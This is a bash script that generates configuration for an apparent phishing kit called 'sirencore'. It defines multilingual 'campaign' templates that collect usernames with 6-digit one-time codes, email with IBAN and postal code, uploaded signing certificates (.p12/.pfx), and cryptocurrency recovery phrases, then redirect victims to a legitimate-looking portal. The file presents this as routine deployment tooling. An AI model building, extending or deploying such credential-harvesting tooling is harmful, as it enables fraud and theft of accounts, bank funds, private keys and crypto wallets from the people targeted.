#!/usr/bin/env bash
# generate-config.sh — produce config.json for a sirencore deployment.
#
# No secrets — keys are injected at runtime via SIREN_KEY_FILE.
# The admin block is opt-in and is NOT generated here: add it to config.json
# with password_hash_file, totp_secret_file and csrf_secret_file.
# Redirect stdout to config.json.
#
# Usage:
#   CAMPAIGN=acme TEMPLATE=tmp-001 \
#     STEP_B_TARGET=https://portal.example.com/done \
#     bash deploy/generate-config.sh > config.json
#
# Required:
#   CAMPAIGN         Campaign identifier. No double-quotes, backslashes,
#                    angle brackets, or control characters.
#
# Optional:
#   TEMPLATE         tmp-001 | tmp-002 | tmp-003 | tmp-004  (default: tmp-001)
#   LISTEN           Bind address            (default: "0.0.0.0:8080")
#   DATA_DIR         Data directory          (default: "/data")
#   STEP_A_TARGET    Redirect after step A   (default: "/c/$CAMPAIGN/$TEMPLATE/b")
#   STEP_B_TARGET    Final redirect          (default: "https://portal.example.com/")
#   ACCEPT_EXTS      Comma-separated extensions for the certificate field (tmp-003).
#                    Default for tmp-003: ".p12,.pfx". Example: ".p12,.pfx,.crt"

set -euo pipefail

# ── helpers ───────────────────────────────────────────────────────────────────

die() { echo "ERROR: $*" >&2; exit 1; }

# json_safe refuses values that would break the JSON output when interpolated
# bare into a double-quoted string. We refuse the small set of characters that
# could inject JSON structure: double-quote, backslash, and control chars.
json_safe() {
  local name="$1" value="$2"
  if [[ "$value" == *'"'* || "$value" == *$'\\'* || "$value" =~ [[:cntrl:]] ]]; then
    die "Variable ${name}='${value}' contains characters that would break JSON (double-quote, backslash, or control character)."
  fi
}

# ── required ──────────────────────────────────────────────────────────────────

CAMPAIGN="${CAMPAIGN:?CAMPAIGN is required}"
json_safe CAMPAIGN "$CAMPAIGN"

# ── optional with safe defaults ───────────────────────────────────────────────

TEMPLATE="${TEMPLATE:-tmp-001}"
LISTEN="${LISTEN:-0.0.0.0:8080}"
DATA_DIR="${DATA_DIR:-/data}"

json_safe LISTEN   "$LISTEN"
json_safe DATA_DIR "$DATA_DIR"

case "$TEMPLATE" in
  tmp-001|tmp-002|tmp-003|tmp-004) ;;
  *)
    die "TEMPLATE='${TEMPLATE}' is not one of: tmp-001, tmp-002, tmp-003, tmp-004."
    ;;
esac

# STEP_A_TARGET depends on CAMPAIGN and TEMPLATE, which are already validated.
STEP_A_TARGET="${STEP_A_TARGET:-/c/${CAMPAIGN}/${TEMPLATE}/b}"
STEP_B_TARGET="${STEP_B_TARGET:-https://portal.example.com/}"

json_safe STEP_A_TARGET "$STEP_A_TARGET"
json_safe STEP_B_TARGET "$STEP_B_TARGET"

# For tmp-003, default to .p12 and .pfx.
# An empty list means "accept any file", which is wrong for a certificate field.
if [[ "$TEMPLATE" == "tmp-003" && -z "${ACCEPT_EXTS:-}" ]]; then
  ACCEPT_EXTS=".p12,.pfx"
fi
ACCEPT_EXTS="${ACCEPT_EXTS:-}"

# ── build accept JSON array ───────────────────────────────────────────────────

build_accept_array() {
  local exts="${1:-}"
  if [[ -z "$exts" ]]; then
    printf '[]'
    return
  fi
  local arr="[" first=1
  IFS=',' read -ra parts <<< "$exts"
  for ext in "${parts[@]}"; do
    ext="${ext// /}"
    [[ -z "$ext" ]] && continue
    [[ "$first" -eq 0 ]] && arr+=","
    arr+="\"${ext}\""
    first=0
  done
  printf '%s' "${arr}]"
}

ACCEPT_ARRAY="$(build_accept_array "${ACCEPT_EXTS}")"

# ── field definitions ─────────────────────────────────────────────────────────
# read -r -d '' returns 1 at EOF (the delimiter is never found in the heredoc
# body), which would trigger set -e. The || true suppresses that expected exit.

case "$TEMPLATE" in
  tmp-001)
    read -r -d '' STEP_A_FIELDS <<'FIELDS' || true
[
              {
                "name": "identifier",
                "kind": "text",
                "max_len": 64,
                "labels": {
                  "fr": "Identifiant",
                  "en": "Username",
                  "de": "Benutzername"
                }
              }
            ]
FIELDS
    read -r -d '' STEP_B_FIELDS <<'FIELDS' || true
[
              {
                "name": "code",
                "kind": "otp",
                "max_len": 6,
                "labels": {
                  "fr": "Code à 6 chiffres",
                  "en": "6-digit code",
                  "de": "6-stelliger Code"
                }
              }
            ]
FIELDS
    ;;

  tmp-002)
    read -r -d '' STEP_A_FIELDS <<'FIELDS' || true
[
              {
                "name": "email",
                "kind": "text",
                "max_len": 254,
                "labels": {"fr": "Adresse e-mail", "en": "Email address", "de": "E-Mail-Adresse"}
              },
              {
                "name": "iban",
                "kind": "iban",
                "max_len": 34,
                "labels": {"fr": "IBAN", "en": "IBAN", "de": "IBAN"}
              },
              {
                "name": "postal_code",
                "kind": "text",
                "max_len": 16,
                "labels": {"fr": "Code postal", "en": "Postal code", "de": "Postleitzahl"}
              }
            ]
FIELDS
    STEP_B_FIELDS='[]'
    ;;

  tmp-003)
    read -r -d '' STEP_A_FIELDS <<'FIELDS' || true
[
              {
                "name": "email",
                "kind": "text",
                "max_len": 254,
                "labels": {
                  "fr": "Adresse e-mail professionnelle",
                  "en": "Work email address",
                  "de": "Geschäftliche E-Mail-Adresse"
                }
              }
            ]
FIELDS
    STEP_B_FIELDS="[
              {
                \"name\": \"certificate\",
                \"kind\": \"file\",
                \"accept\": ${ACCEPT_ARRAY},
                \"labels\": {
                  \"fr\": \"Certificat de signature\",
                  \"en\": \"Signing certificate\",
                  \"de\": \"Signaturzertifikat\"
                }
              }
            ]"
    ;;

  tmp-004)
    read -r -d '' STEP_A_FIELDS <<'FIELDS' || true
[
              {
                "name": "email",
                "kind": "text",
                "max_len": 254,
                "labels": {"fr": "Adresse e-mail", "en": "Email address", "de": "E-Mail-Adresse"}
              }
            ]
FIELDS
    # seed must NOT carry max_len — sirencore refuses it at boot.
    read -r -d '' STEP_B_FIELDS <<'FIELDS' || true
[
              {
                "name": "seed",
                "kind": "seed",
                "labels": {
                  "fr": "Phrase de récupération",
                  "en": "Recovery phrase",
                  "de": "Wiederherstellungsphrase"
                }
              }
            ]
FIELDS
    ;;
esac

# ── emit config ───────────────────────────────────────────────────────────────

cat <<JSON
{
  "listen": "${LISTEN}",
  "data_dir": "${DATA_DIR}",
  "campaigns": {
    "${CAMPAIGN}": {
      "templates": {
        "${TEMPLATE}": {
          "a": {
            "target": "${STEP_A_TARGET}",
            "mode": "inline",
            "fields": ${STEP_A_FIELDS}
          },
          "b": {
            "target": "${STEP_B_TARGET}",
            "mode": "inline",
            "fields": ${STEP_B_FIELDS}
          }
        }
      }
    }
  }
}
JSON
